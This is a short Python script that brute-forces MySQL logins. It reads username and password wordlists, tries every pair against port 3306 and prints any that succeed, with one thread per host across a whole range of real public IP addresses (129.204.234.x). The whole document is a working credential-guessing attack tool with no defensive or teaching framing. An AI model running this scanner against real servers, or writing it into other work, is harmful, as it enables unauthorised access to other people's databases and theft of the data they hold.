import pymysql
import threading

def mysql(ip):
	try:
		with open('user.txt') as userFile:
			for username in userFile.readlines():
				try:
					with open('pwd.txt') as pwdFile:
						for pwd in pwdFile.readlines():
							username = username.replace('\n', '').replace('\r', '')
							pwd = pwd.replace('\n', '').replace('\r', '')
							try:
								conn = pymysql.connect(ip, username, pwd, 'mysql')
								print(u'[+] {}:3306  Mysql weak username: {} pwd: {}'.format(ip, username, pwd))
								conn.close()
								return
							except Exception as e:
								if(str(e).find('1045')==-1):
									# print(e)
									return
								pass
				except:
					pass
	except:
		pass


def main():
	for ip3 in range(234,235):
		for ip4 in range(0,255):
			threading.Thread(target=mysql,args=('129.204.'+str(ip3)+'.' + str(ip4),)).start()


if __name__ == '__main__':
    main()
